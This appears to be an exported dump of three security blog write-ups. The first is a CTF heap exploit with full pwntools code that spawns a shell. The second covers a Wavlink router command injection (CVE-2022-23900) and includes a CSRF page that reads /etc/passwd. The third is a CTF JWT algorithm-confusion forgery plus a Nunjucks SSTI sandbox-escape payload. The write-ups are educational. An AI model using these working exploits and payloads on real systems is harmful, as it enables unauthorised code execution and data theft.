PIE it’s unlikely we will be able to exploit a stack based vulnerability. Furthermore, full RELO makes the entire GOT read only, so we can’t use an arbitrary write to overwrite a GOT address. This means we will likely be dealing with a heap based attack. Taking a look at the libc provided, we can see it is version 2.27We can refer to the following chart (source: https://hackmag.com/coding/htb-ropetwo-uaf/) for valid heap based attacks by version of glibc:Vulnerabilities:Now that we understand how the binary works, it’s time to discuss the vulnerabilities.Use-After-Free:The Use-after-free vuln was the first one I located, based strictly on the functionality of the binary. When we choose option 5 in the menu, we get a message stating [!] Old class has been deleted and your stats will change! Feel free to choose another class!. Taking a look at the change_class handler function below, we can confirm that first, player-&gt;class is assigned to a newly malloc’d pointer, and then that pointer is free’d.However, we know that menu option 3, “Show stats”, will read from the class pointer in the player struct. So what happens if we run option 3 after option 5?As shown above, our “Class” now seems to contain garbage data instead of “Mage”. Taking a look at program memory, we can see the player’s class pointer points to 0x555555605300, which after being free’d now contains two little-endian hex values: 0x5555556052d0 and 0x555555604010. The free’d chunks still show up in the heap chunks because of the tcache. Future posts will go into further details on the glibc internals.You may notice that these hex values are the address of the previous chunk and the address of the first chunk respectively, thus leaking the address of the heap. I spent a while on this bug seeing if there was any way to weaponize it more, but the leak is the only primative it gives us. This will be helpful to bypass ASLR, but we will need another bug (or two) in order to craft an exploit.Heap Metadata Corruption:Our second bug is in the binary’s “Craft Sword” functionality, which is option 1 in the game menu.As shown above, the program reads our input and malloc’s that size, allowing us the ability to malloc arbitrary sizes through normal program interaction. Next, it asks us to input a 1, 2, or 3 to choose what we want to “empower our sword” with. However, notice that instead of using the read_num() function, a standard read is used. This means we can specify any data, and it will be read to our newly malloc’d memory. Furthermore, you will notice that read will actually read up to __size + 8 data into our __buf pointer, meaning there is a 7-byte heap based buffer overflow. We can confirm this by providing a size for malloc, and then a data payload that is 7 bytes longer than the specified size.Now, observing our heap we see the following:We can see that our 7 byte overwrite affects the size of the top chunk in our program. Nice! This indicates we may be able to execute a House Of Force attack. Normally, the top chunk’s size is the heap’s total allocated space minus the already allocated chunk sizes, bordering the end of the heap memory. With the overflow, we can now force malloc to return and thus overwrite arbitrary pointers in memory OUTSIDE of the heap’s memory space. However, due to ASLR, we don’t know where things outside of the heap memory are located, and thus we need another leak…Format String:Okay to be honest, this is where I got stuck while the CTF was still running and I felt a little silly afterwards. Thanks to the person in discord who was able to give me a small hint that pushed me in the right direction. Back in our main function, when we are prompted to pick a class, there is an else block in the conditional that auto assigns us the Tank class if our option does not match any of the acceptable options.As shown above, there conditional starts with three printf statements which combine to print \"There is no &lt;USER INPUT&gt; class! You will follow the Tank path...\". Notice the second printf puts our user input directly into the function, resulting in a classic format string vulnerability. Taking a look at how menu_choice_2 is set, we see that we are constrained to 6 characters:We can leverage this vulnerability to leak variables from the stack. Lets use %p as our payload and set a break point right before the 2nd print (main+521) function call. We are trying to leak an address from libc, so we also need to find where libc is loaded. We can do so with info proc mappings. This results in the following:We can see the base address for libc is 0x7ffff79e2000. This will change on each run (outside of GDB) due to ASLR as described earlier.Dumping the stack with x/50gx $rsp, we can see there is one stack variable which is a pointer to somewhere in libc’s memory range.Through a fairly boring and far-too-long manual process, I was able to determine the proper offset to leak this variable was 13.Then to determine our base address, we need to subtract 0x21c87:0x00007ffff7a03c87 - 0x21c87 = 0x7ffff79e2000 = libc baseNice, we now have everything we need to write an exploit!Exploit:When doing research on House of Force, I found a fantastic write-up by Adam Force that explains a basic strategy to get RCE. The idea is to overwrite __malloc_hook, a function called before each malloc, with system, and pass it a pointer to /bin/sh\\0. Therefore, our exploit will work as follows. Set our name to /bin/sh\\0, which will be stored on the heap at an address we know through our leaks Trigger the format string vuln to leak libc base Choose menu option 5 to trigger the UAF vuln and then choose option 3 to leak the heap address Use the craft sword function to corrupt the top chunk size Use the craft sword function to allocate a chunk up to the address of __malloc_hook Use the craft sword function to create chunk to overwrite __malloc_hook with the system address Call craft sword one last time with a pointer to the name in our player object to get a shell.Step One:We will use pwntools for this exploit. First we need to set up the binary to run with the provided glibc and then send it our name.from pwn import *elf = ELF(\"./swordmaster\") libc = ELF(\"./glibc/libc.so.6\") p = elf.process(['./glibc/ld-linux-x86-64.so.2','./swordmaster'],env={\"LD\\_PRELOAD\":\"./glibc/libc.so.6\"}) p.sendline('/bin/sh\\0')Step Two:Next, we need to leak the libc address with the format string vulnerability. We can do so by waiting for the text prompt, sending %13$p as our class, and then parsing the address out of the received line. Lastly, we subtract 0x21c87 as described above and set libc.address accordingly. pwntools now knows the base address of libc and can load it’s symbols at the proper addresses.p.recvuntil(b'&gt;&gt; ') p.sendline(b'%13$p') p.recvuntil('There is no ') libc_leak = p.recvline().split(b' ')[0] libc_leak = int(libc_leak[2:], 16) libc.address = libc_leak - 0x21c87Step 3:Similar to the above step, we need to interact with the program to exploit the UAF bug and get our heap base address. We do so by sending 5 to delete our player’s class, and then sending 3 to display our stats. We can parse the received line and grab the leaked hex value, which we know from our previous recon will be the value of the previously allocated chunk. At this point in the program, the heap layout will always be the same, so we can use a static offset to get back to the heap base.p.recvuntil(b'&gt;&gt; ') p.sendline(b'5') p.recvuntil(b'&gt;&gt; ') p.sendline(b'3') p.recvuntil(b'Class: ') heap = p.recvline()[:-1] heap = int.from_bytes(heap, 'little') - 4800 - 0x10Step 4:Now it’s time to start the heap exploitation process. To make matters simpler, we can write a wrapper around the craft sword program interaction.def malloc(size, data): p.recvuntil(b'&gt;&gt; ') p.sendline(b'1') p.recvuntil(b'&gt;&gt; ') p.sendline(str(size)) p.recvuntil(b'&gt;&gt; ') p.sendline(data)Now we need to corrupt the top chunk size. We can do this programmatically the same way we did manually earlier:malloc(40, b'\\x41'*47)Next, we want to malloc all the way up to just before __malloc_hook. We can do so by doing the following: __malloc_hook address - (heap base + already allocated space) - 0x10. Looking at the current state of our heap at this point in the exploit, we see the following:Adding all the allocated sizes together, we get 0x250 + 0x1010 + 0x30 + 0x30 + 0x30 + 0x30 = 0x1320. We also need to add an additional 0x10 since we are using the heap base, which is 0x10 before the first chunk on the heap. Therefore we have the following code:distance = libc.sym.__malloc_hook - (heap + 0x1330) - 0x10 malloc(distance, 'dummy')Note that we subtract 0x10 so that we get a pointer just before __malloc_hook. Therefore, on the next call to malloc, the allocator will return a pointer to __malloc_hook.Step 5:Almost there, we need to call malloc another time. The data we include in this call will overwrite the __malloc_hook. Therefore, we use the following code:malloc(24, p64(libc.sym.system))Step 6:Last step, we need to get a pointer to our name, /bin/sh\\0. This is always located 0x1270 from the heap base. Instead of providing a size when crafting a sword, we will provide this pointer. Now instead of __malloc_hook running before the malloc takes place, system(\"/bin/sh\\0\") will run resulting in a shell.cmd = heap + 0x1270p.recvuntil(b'&gt;&gt; ')p.sendline(b'1')p.recvuntil(b'&gt;&gt; ')p.sendline(str(cmd))Full Exploit Code:The full exploit is included below. You can also view it on my github.from pwn import * import sys if not sys.warnoptions: import warnings warnings.simplefilter(\"ignore\") elf = ELF(\"./swordmaster\") libc = ELF(\"./glibc/libc.so.6\") p = elf.process(['./glibc/ld-linux-x86-64.so.2','./swordmaster'],env={\"LD\\_PRELOAD\":\"./glibc/libc.so.6\"}) # ---- SET NAME ---- p.sendline('/bin/sh\\0') # ---- LEAK LIBC BASE WITH FORMAT STRING BUG ---- p.recvuntil(b'&gt;&gt; ') p.sendline(b'%13$p') p.recvuntil('There is no ') libc_leak = p.recvline().split(b' ')[0] libc_leak = int(libc_leak[2:], 16) libc.address = libc_leak - 0x21c87 log.info(\"LEAKED LIBC BASE: \" + hex(libc.address)) # ---- LEAK HEAP BASE WITH UAF BUG ------- p.recvuntil(b'&gt;&gt; ') p.sendline(b'5') p.recvuntil(b'&gt;&gt; ') p.sendline(b'3') p.recvuntil(b'Class: ') heap = p.recvline()[:-1] heap = int.from_bytes(heap, 'little') - 4800 - 0x10 log.info(\"LEAKED HEAP BASE: \" + str(hex(heap))) def malloc(size, data): p.recvuntil(b'&gt;&gt; ') p.sendline(b'1') p.recvuntil(b'&gt;&gt; ') p.sendline(str(size)) p.recvuntil(b'&gt;&gt; ') p.sendline(data) # ---- House Of Force Set-Up ---- malloc(40, b'\\x41'*47) # ---- Point top chunk to __malloc_hook ---- distance = libc.sym.__malloc_hook - (heap + 0x1330) - 0x10 malloc(distance, 'dummy') # ---- Overwrite __malloc_hook with system ---- malloc(24, p64(libc.sym.system)) # ---- Point cmd at our name (/bin/sh) and call malloc to execute our overwritten hook ---- cmd = heap + 0x1270 p.recvuntil(b'&gt;&gt; ') p.sendline(b'1') p.recvuntil(b'&gt;&gt; ') p.sendline(str(cmd)) p.interactive()" }, { "title": "Wavlink Command Injection - CVE-2022-23900", "url": "/posts/wavlink-command-injection/", "categories": "Vuln Research, IoT", "tags": "firmware, research, iot", "date": "2022-04-05 21:33:00 -0600", "snippet": "Wavlink Command Injection (CVE-2022–23900)TL/DR:The Wavlink WL-WN531P3 router exposes an API endpoint susceptible to command injection. This API endpoint is reachable without an authentication header, meaning the vulnerability can be exploited by an unauthenticated attacker. Furthermore, the router has no CSRF protection, thus RCE can be achieved without connecting to the local network.Vulnerability Description and Discovery:The router hosts an API that is used to accept requests made from within the Admin portal. One thing a user can do from within this portal is send a ping command. An example has been included below:Because ping is a well-known bash command, we may immediately begin to theorize about the possibility of command injection.Command Injection Explanation:For those unfamiliar with command injection, here is a quick rundown:Let’s take the above ping functionality and walk through what could be happening between the web portal and the router. You as the user input the IP you wish to ping. The Admin portal sends a request to the router with the IP you specified. The router’s API endpoint handles the request with something like the following (yes this example has a BOF, it’s strictly an example):char command[50];strcpy(command, “ping “)strcat(command, user_specified_ip)system(command)In the above code, we first add “ping “ to the command buffer. Then we add what is stored in user_specified_ip to our buffer, imagining this variable is storing the IP we specified in the Admin portal. Finally, we run system(command) which will execute our shell command (ping &lt;ip&gt;) on the underlying host operating system.Abusing the system command:You can run two shell commands in one line if you delaminate them with a ; . So if you open a command prompt and run whoami; touch test.txt , the command will first output the result whoami and then it will create the file test.txt. With this knowledge, we can exploit the ping example from above. Instead of inputting an IP in the admin panel, we input ; whoami. Now the command that gets run on the underlying OS is ping ; whoami. The ping command fails as no argument is provided to it, and whoami subsequently executes, demonstrating an ability to run arbitrary commands on the box.Exploitation:So, spoiler alert but the explanation above is pretty much verbatim what is happening on the router. We can demonstrate this by providing the following input:We can also prove that the filesystem is not just read-only by creating a new file.Things get slightly more interesting though. Looking at the screenshot of a malicious request below, we note that the pingIp variable, which is sent in a POST to the /cgi-bin/adm.cgi endpoint, is what contains our payload. Here we are reading the contents of /etc/passwdBecause the user is logged in to the Admin portal, our malicious request includes a session cookie in the header (line 13 in the above screenshot). However, if we remove that header, the request is still successful, demonstrating this vulnerability is exploitable by an unauthenticated attacker.Chaining with a CSRF:The last step to weaponizing this exploit is adding the malicious request to an attacker-controlled website. The idea is as follows: An attacker from anywhere in the world creates a website that sends a malicious request to 192.168.10.1/cgi-bin/adm.cgi. The attacker sends the site to someone with the vulnerable Wavlink router. The victim opens the site, and a malicious request is sent to the router on their local network.We can use the following fake website to achieve this result:Note that I have our payload submitted on a button click, but we could have it take place on page load for less required user interaction.&lt;html&gt; &lt;body&gt; &lt;h1&gt;Totally Not Malicious Website&lt;/h1&gt; &lt;form action=\"http://192.168.10.1/cgi-bin/adm.cgi\" method=\"POST\"&gt; &lt;input type=\"hidden\" name=\"page\" value=\"ping_test\" /&gt; &lt;input type=\"hidden\" name=\"CCMD\" value=\"4\" /&gt; &lt;input type=\"hidden\" name=\"pingIp\" value=\"; cat /etc/passwd\" /&gt; &lt;input type=\"submit\" value=\"DONT CLICK\" /&gt; &lt;/form&gt; &lt;/body&gt; &lt;/html&gt;And with that, an unauthenticated RCE from outside the local network can be achieved on any Wavlink WL-WN531P3 router.Closing Thoughts:This is a meme of an issue, but it is my first official CVE so I’ll take it. It does emphasize that IoT devices still struggle with low-hanging vulnerabilities, so if you are looking for a way to get started in security research, this is a good area to get your hands dirty.If you enjoyed this write-up, feel free to follow me on Twitter @stigward, where I tweet things about security, programming, and current projects. Currently, I am working on some content related to IoT hacking and smart contract auditing" }, { "title": "JWT Confusion and SSTI - CyberSanta CTF Naughty or Nice Web Challenge", "url": "/posts/naughty-or-nice-web-chal/", "categories": "CTF, Web", "tags": "web, ctf, ssti, jwt", "date": "2021-12-09 20:33:00 -0700", "snippet": "Naughty Or Nice Web ChallengeTL;DR:Getting the flag on this challenge requires two separate steps. First, we must obtain access to the admin account byexploiting a flaw in the JWT verification process. Once inside the admin account, we are ableto edit the “Naughty and Nice” list displayed on homepage. We can leverage a Server Side Template Injection (SSTI) vulnerabilityto obtain remote code execution and read the flag.Recon:Navigating to the site, we are greeted with a “Naughty Or Nice” list and the option to navigate to a sign-in page.The sign-in page allows us to register for an account and use our credentials to login. Once logged in,we are redirected to the /dashboard endpoint. This endpoint displays a message saying that we “shall not pass”.A quick glance at the code in /challenge/routes/index.js shows the following for a the /dashboard endpoint:router.get(\"/dashboard\", AuthMiddleware, async (req, res) =&gt; { return db .getUser(req.data.username) .then((user) =&gt; { if (user.username == \"admin\") return res.render(\"admin.html\"); res.render(\"dashboard.html\", { user }); }) .catch(() =&gt; res.status(500).send(response(\"Something went wrong!\")));});This shows that if we are the admin user, then we will get routed to the Admin dashboard. Otherwise we recieve unauthorized page shown above.Getting Admin:Once logged in, we get a JWT token.Using jwt.io we can see in the decoded JWT that it is using RS256 and the data section contains our username and a public key.Back in the code base, we find JWTHelper.js in the /challenge/helpers/ directory. It contains the code to both create and verify the JWT tokens the web-app uses.const jwt = require('jsonwebtoken');const NodeRSA = require('node-rsa');const keyPair = new NodeRSA({b: 512}).generateKeyPair();const publicKey = keyPair.exportKey('public')const privateKey = keyPair.exportKey('private')module.exports = {\tasync sign(data) {\t\tdata = Object.assign(data, {pk:publicKey});\t\treturn (await jwt.sign(data, privateKey, { algorithm:'RS256' }))\t},\tasync verify(token) {\t\treturn (await jwt.verify(token, publicKey, { algorithms: ['RS256', 'HS256'] }));\t}}JWT Signing:Lets break down the sign function first. It gets passed a data parameter which, looking back at the /routes/index.js, we see in the handler for a POST request to the /login endpoint has the following format:JWTHelper.sign({ username: user.username })On the first line of the function, we see the public key is added to the data object. Next, the sign function from the jsonwebtoken package called.Referring to the documentation, this has a function signature of jwt.sign(payload, secretOrPrivateKey, [options, callback]), and we are therefore returning a JWT token that has our username and public key as the data,signed by a private key known only to the server, using the RS256 algorithm. Seems fairly secure.JWT Verify:Next lets take a look at verify. Here we are given a token as the parameter and return the result of the verify function from the jsonwebtoken package. Again referencingthe documentation, we see that jsonwebtoken’s verify function has the following function signature: jwt.verify(token, secretOrPublicKey, [options, callback]).This lines up with what we would expect, as we see this function being passed our JWT token and the server’s public key. However, in our code base, we see the options parameter can verify a token that uses either RS256 or HS256.return (await jwt.verify(token, publicKey, { algorithms: ['RS256', 'HS256'] }));Creating an Admin JWT:Based on what we observed above, we now have all the information we need to create a verified admin JWT token. The public token is known to us, as it is provided within the data section of the JWT. Within the jwt.verifyfunction, the public key is supplied as the secretOrPublicKey parameter. When the JWT header specifies that the algorithm is RS256, jwt.verify interprets the secretOrPublicKey parameter as a public key. However, if the JWT specifies the algorithm HS256 in the header, then the jwt.verify function interprets the secretOrPublicKey as a secret! Thus if a token using HS256 and signed by our public key was passed to the verify function,it would pass!This verify function is called in AuthMiddleware like so:\treturn JWTHelper.verify(req.cookies.session)\t\t.then(username =&gt; {\t\t\treq.data = username;\t\t\tnext();\t\t})\t\t.catch((e) =&gt; {\t\t\tconsole.log(e);\t\t\tres.redirect('/logout');\t\t});So we can see, once the JWT is verified, the logged in user is determined by the username field in the data section of the JWT.Therefore, we can use the following script to create an admin JWT:const jwt = require(\"jsonwebtoken\");publicKey = \"-----BEGIN PUBLIC KEY-----\\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAtCKM9IX5ZlUs8hWTEa75\\neu6mU09aoHm5jd36mDjaopQ8alaWcHykhVXXsd9Dfp+m86cV4zIbmH4FnZGw2wQT\\nPEv824kR4amWL9X2/7TCu6jgM0SQuA+E7KJvMJTf8ycLqdwx3TQFQVAE35zzlvAw\\n+MdONz1uQWXh2f6tz6oT+eD/CLd5rJRjxVyraykECcYBDAjOtOjU5NcnTiwU1t2z\\nJ6kOkPlG6t7f5zJ8QnHFByIRDKqsRjCo/2cIdLToBaINt85lZy0j5EyWRM+Sfk6b\\nNG+CCmR7v1dE2dUIJ5IeXqQ/KSyOxSV0RNbtp9f5pwilaOG+gFeAPAxW0B3PS/cQ\\neQIDAQAB\\n-----END PUBLIC KEY-----\"data = {'username': 'admin'}data = Object.assign(data, {pk:publicKey});key = jwt.sign(data, publicKey, { algorithm:'HS256' })console.log(key)If we decode our new JWT, we now see the following:Go back to the web-app, and set our cookie to the new JWT.Refresh, and we are in the admin dashboard!Getting The FlagNow we are in the admin dashboard, but we need full code execution in order to obtain the flag. From the dashboard, we have the ability to edit the“Naughty or Nice” list displayed on the landing page. The card on the landing page that displays the list has a helper, CardHelpers.js in the /challenge/helpers/ directory.const nunjucks = require('nunjucks');module.exports = {\tasync generateCard(elfList) {\t\treturn new Promise(async (resolve, reject) =&gt; {\t\t\ttry {\t\t\t\tlet NaughtyNames = NiceNames = '&lt;br&gt;';\t\t\t\tfor(elfData of elfList) {\t\t\t\t\tif (elfData.type == 'naughty') {\t\t\t\t\t\tNaughtyNames = `${NaughtyNames}\\n${elfData.elf_name}&lt;br&gt;`;\t\t\t\t\t}\t\t\t\t\telse if (elfData.type == 'nice') {\t\t\t\t\t\tNiceNames = `${NiceNames}\\n${elfData.elf_name}&lt;br&gt;`;\t\t\t\t\t}\t\t\t\t}\t\t\t\tcard = `\t\t\t\t\t{% extends \"card.html\" %}}\t\t\t\t\t{% block card %}\t\t\t\t\t&lt;div class=\"card\"&gt;\t\t\t\t\t\t&lt;div class=\"card-page cart-page-front\"&gt;\t\t\t\t\t\t\t&lt;div class=\"card-page cart-page-outside\"&gt;&lt;/div&gt;\t\t\t\t\t\t\t&lt;div class=\"card-page cart-page-inside\"&gt;\t\t\t\t\t\t\t&lt;p&gt;&lt;span class='nheader green'&gt;Nice List&lt;/span&gt;\t\t\t\t\t\t\t\t${NiceNames}\t\t\t\t\t\t\t&lt;/p&gt;\t\t\t\t\t\t\t&lt;/div&gt;\t\t\t\t\t\t&lt;/div&gt;\t\t\t\t\t\t&lt;div class=\"card-page cart-page-bottom\"&gt;\t\t\t\t\t\t\t&lt;p&gt;&lt;span class='nheader red'&gt;Naughty List&lt;/span&gt;\t\t\t\t\t\t\t\t${NaughtyNames}\t\t\t\t\t\t\t&lt;/p&gt;\t\t\t\t\t\t&lt;/div&gt;\t\t\t\t\t&lt;/div&gt;\t\t\t\t\t{% endblock %}\t\t\t\t`;\t\t\t\tresolve(nunjucks.renderString(card));\t\t\t} catch(e) {\t\t\t\treject(e);\t\t\t}\t\t})\t}};Nunjucks SSTI and Sandbox Escape:Here, we see the code base is leveraging Nunjucks to help render the card. Nunjucks is a templating engine specifically forJavaScript, which immediately makes me think this might be some sort of template injection vulnerability. We can do a quick test to confirm.First, we edit one of the items to contain ``.Navigating back to the homepage, we see that the our `` payload renders as 49, confirming that we have found a Server Side Template Injection!If we continue to poke around on Google, we find some research has already been done on SSTI within Nunjucks. Nunjucks template code runs in a sandbox, so in order to get RCE we need to break out of that sandbox and access the underlying OS. If you are interested in how this sandbox escape works, checkout the pre-existing research that I used as a reference during this challenge - SANDBOX BREAKOUT - A VIEW OF THE NUNJUCKS TEMPLATE ENGINE. From that article, we see the researchers obtained RCE with the following command:{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('tail /etc/passwd')\")()}}Modifying this payload, we can obtain the flag!Final Payload:First, we run{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('ls /')\")()}}We see the flag here, and we can change the payload to cat it out!" } ]
